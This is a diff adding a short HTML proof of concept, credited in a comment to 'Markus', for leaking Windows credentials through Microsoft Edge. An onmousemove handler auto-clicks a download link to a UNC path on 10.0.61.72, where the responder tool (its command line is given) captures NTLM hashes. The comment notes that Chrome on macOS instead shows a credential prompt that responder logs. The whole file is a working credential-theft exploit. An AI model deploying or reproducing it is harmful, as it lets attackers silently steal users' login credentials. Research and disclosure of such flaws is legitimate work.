@@ -1,0 +1,19 @@
+<html>
+<!-- 
+original PoC: Markus
+10.0.61.72 runs reponder with the following options:
+responder -I eth0 -w -r f -v 
+
+As soon as the mouse is in the page, the request triggers in Edge 15/Win10
+ without user interaction since the link is auto-clicked. Credentials are leaked
+ to responder.
+
+ Doesn't work on Chrome on Windows. on Chrome for OSX just shows a normal credential
+ prompt (like a BasicAuth protected resource) and responder captures anything entered.
+ -->
+<head>
+</head>
+<body onmousemove="document.getElementById(6).click()">
+<a id=6 href="\\10.0.61.72\edgeleak" download>tryme</a>
+</body>
+</html>
